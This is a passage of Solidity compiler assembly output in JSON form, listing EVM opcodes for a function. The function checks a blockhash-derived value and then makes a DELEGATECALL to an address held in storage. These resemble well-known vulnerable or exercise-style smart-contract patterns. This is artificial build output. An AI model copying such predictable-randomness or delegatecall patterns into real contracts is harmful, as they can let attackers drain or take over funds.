											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1059,
											"end": 1066,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1079,
											"end": 1094,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1148,
											"end": 1149,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1137,
											"end": 1143,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1137,
											"end": 1143,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1131,
											"end": 1132,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1116,
											"end": 1128,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1116,
											"end": 1132,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1106,
											"end": 1133,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 1098,
											"end": 1134,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1098,
											"end": 1134,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1098,
											"end": 1143,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1149,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1079,
											"end": 1149,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1079,
											"end": 1149,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1175,
											"end": 1185,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1185,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1185,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 1163,
											"end": 1171,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1185,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1185,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1163,
											"end": 1185,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1160,
											"end": 1233,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1160,
											"end": 1233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1160,
											"end": 1233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1202,
											"end": 1221,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1160,
											"end": 1233,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1160,
											"end": 1233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1243,
											"end": 1255,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1268,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1243,
											"end": 1268,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1287,
											"end": 1310,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D"
										},
										{
											"begin": 1312,
											"end": 1322,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1269,
											"end": 1323,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DELEGATECALL",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1243,
											"end": 1324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1346,
											"end": 1356,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 1335,
											"end": 1356,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1068,
											"end": 1364,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 116,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 7,
											"end": 116,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 88,
											"end": 109,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 103,
											"end": 108,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 88,
											"end": 109,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 88,
											"end": 109,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 83,
											"end": 86,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 76,
											"end": 110,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 116,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 122,
											"end": 237,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 122,
											"end": 237,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 224,
											"end": 229,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 207,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 207,
											"end": 230,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 202,
											"end": 205,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 195,
											"end": 231,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 122,
											"end": 237,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 122,
											"end": 237,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 122,
											"end": 237,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 243,
											"end": 616,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 243,
											"end": 616,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 347,
											"end": 350,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 375,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 407,
											"end": 412,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 375,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 375,
											"end": 413,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 375,
											"end": 413,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 375,
											"end": 413,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 429,
											"end": 517,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 510,
											"end": 516,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 505,
											"end": 508,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 429,
											"end": 517,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 429,
											"end": 517,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 429,
											"end": 517,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 429,
											"end": 517,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 422,
											"end": 517,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 422,
											"end": 517,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 526,
											"end": 578,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 571,
											"end": 577,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 566,
											"end": 569,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 559,
											"end": 563,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 552,
											"end": 557,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 548,
											"end": 564,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 526,
											"end": 578,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 526,
											"end": 578,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 526,
											"end": 578,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 526,
											"end": 578,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 603,
											"end": 609,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 598,
											"end": 601,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 594,
											"end": 610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 587,
											"end": 610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 587,
											"end": 610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 616,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 243,
											"end": 616,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 243,
											"end": 616,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 243,
											"end": 616,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 243,
											"end": 616,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 243,
											"end": 616,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 622,
											"end": 987,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 622,
											"end": 987,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 764,
											"end": 767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 785,
											"end": 851,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 849,
											"end": 850,
											"name": "PUSH",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 844,
											"end": 847,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 785,
											"end": 851,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 785,
											"end": 851,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 785,
											"end": 851,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 785,
											"end": 851,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 778,
											"end": 851,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 778,
											"end": 851,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 860,
											"end": 953,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 949,
											"end": 952,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 860,
											"end": 953,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 860,
											"end": 953,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 860,
											"end": 953,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 860,
											"end": 953,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 978,
											"end": 980,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 973,
											"end": 976,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 969,
											"end": 981,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 962,
											"end": 981,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 962,
											"end": 981,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 622,
											"end": 987,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 622,
											"end": 987,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 622,
											"end": 987,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 622,
											"end": 987,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 993,
											"end": 1111,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 993,
											"end": 1111,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1080,
											"end": 1104,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1098,
											"end": 1103,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1080,
											"end": 1104,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 1080,
											"end": 1104,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1080,
											"end": 1104,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1080,
											"end": 1104,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1075,
											"end": 1078,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1068,
											"end": 1105,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1111,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1111,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 993,
											"end": 1111,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1247,
											"end": 1250,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1269,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1358,
											"end": 1361,
